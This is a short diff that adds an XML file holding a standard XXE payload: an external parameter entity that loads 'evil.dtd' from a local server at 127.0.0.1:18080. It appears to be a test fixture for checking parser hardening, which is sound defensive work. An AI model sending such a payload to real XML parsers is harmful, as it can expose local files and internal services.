@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % ext SYSTEM "http://127.0.0.1:18080/evil.dtd">
+%ext;
+]>
+<r/>
